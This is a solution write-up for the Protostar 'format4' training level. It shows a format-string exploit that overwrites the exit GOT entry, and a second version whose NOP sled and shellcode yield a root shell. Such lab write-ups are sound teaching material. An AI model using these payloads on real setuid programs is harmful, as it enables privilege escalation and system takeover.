# format4

## solution
```
user@protostar:/opt/protostar/bin$ objdump -R ./format4

./format4:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
080496fc R_386_GLOB_DAT    __gmon_start__
08049730 R_386_COPY        stdin
0804970c R_386_JUMP_SLOT   __gmon_start__
08049710 R_386_JUMP_SLOT   fgets
08049714 R_386_JUMP_SLOT   __libc_start_main
08049718 R_386_JUMP_SLOT   _exit
0804971c R_386_JUMP_SLOT   printf
08049720 R_386_JUMP_SLOT   puts
08049724 R_386_JUMP_SLOT   exit
```

```
(gdb) disas hello
Dump of assembler code for function hello:
0x080484b4 <hello+0>:	push   %ebp
0x080484b5 <hello+1>:	mov    %esp,%ebp
0x080484b7 <hello+3>:	sub    $0x18,%esp
0x080484ba <hello+6>:	movl   $0x80485f0,(%esp)
0x080484c1 <hello+13>:	call   0x80483dc <puts@plt>
0x080484c6 <hello+18>:	movl   $0x1,(%esp)
0x080484cd <hello+25>:	call   0x80483bc <_exit@plt>
End of assembler dump.
```

```
(gdb) r
Starting program: /opt/protostar/bin/format4 
AAAABBBB%4$x%5$x      

Breakpoint 1, 0x08048503 in vuln () at format4/format4.c:20
20	in format4/format4.c
(gdb) c
Continuing.
AAAABBBB4141414142424242
```

```
>>> 0x84b4 - 8
33964
>>> 0x010804 - 33964 - 8
33616
```

```py
import struct

tar_p1 = struct.pack('I', 0x08049724)
tar_p2 = struct.pack('I', 0x08049724 + 0x2)

payload = tar_p1 + tar_p2

# 0x080484b4

payload += '%33964d' + '%4$n'
payload += '%33616d' + '%5$n'

print payload
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ python /tmp/pwn.py | ./format4

...

code execution redirected! you win
```

## shell
```py
import struct

tar_p1 = struct.pack('I', 0x08049724)
tar_p2 = struct.pack('I', 0x08049724 + 0x2)

buf = '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9'
buf += '\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89'
buf += '\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

nop = '\x90' * 0x80

payload = tar_p1 + tar_p2

# 0xbffff5ee

payload += '%62950d' + '%4$n'
payload += '%51729d' + '%5$n'

print payload + nop + buf
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ python /tmp/pwn.py | ./format4

...

# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```
